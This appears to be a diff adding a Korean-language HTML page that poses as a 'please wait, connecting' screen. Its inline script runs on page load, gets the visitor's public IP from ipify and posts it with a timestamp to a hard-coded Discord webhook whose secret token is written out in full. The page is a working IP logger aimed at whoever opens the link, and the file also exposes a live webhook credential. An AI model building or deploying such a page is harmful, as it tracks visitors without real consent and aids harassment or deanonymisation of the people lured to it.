@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>접속 중...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f0f2f5;
+      font-family: sans-serif;
+    }
+    .container {
+      text-align: center;
+      background: white;
+      padding: 60px;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      max-width: 400px;
+    }
+    h1 { color: #5865F2; margin-bottom: 20px; }
+    #status {
+      padding: 20px;
+      border-radius: 12px;
+      font-size: 1.1em;
+      min-height: 80px;
+    }
+    .success { background: #d4edda; color: #155724; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>잠시만 기다려주세요...</h1>
+    <div id="status">접속 정보를 기록 중입니다...</div>
+  </div>
+
+  <script>
+    window.addEventListener('load', async () => {
+      const status = document.getElementById('status');
+
+      try {
+        // IP 주소 가져오기
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+
+        const now = new Date().toISOString();
+
+        // Discord로 보낼 데이터
+        const payload = {
+          embeds: [{
+            title: "새 접속",
+            color: 0x5865F2,
+            fields: [
+              { name: "IP 주소", value: `\`${ip}\``, inline: true },
+              { name: "접속 시간", value: now, inline: true }
+            ],
+            footer: { text: "Busan" },
+            timestamp: now
+          }]
+        };
+
+        // 아까 주신 웹훅 주소 그대로
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1462322987553525924/MCgk8No-_JHqNg14TGatbnAlRfE14i6ga71AoNvyhp-pccSAjrBf7_wNGI_23uqrEnvY";
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        status.innerHTML = "기록 완료 ✓";
+        status.className = 'success';
+
+      } catch (err) {
+        console.error('에러:', err);
+        status.innerHTML = "기록 실패 ㅠㅠ<br>콘솔(F12) 확인해주세요";
+      }
+    });
+  </script>
+
+</body>
+</html>
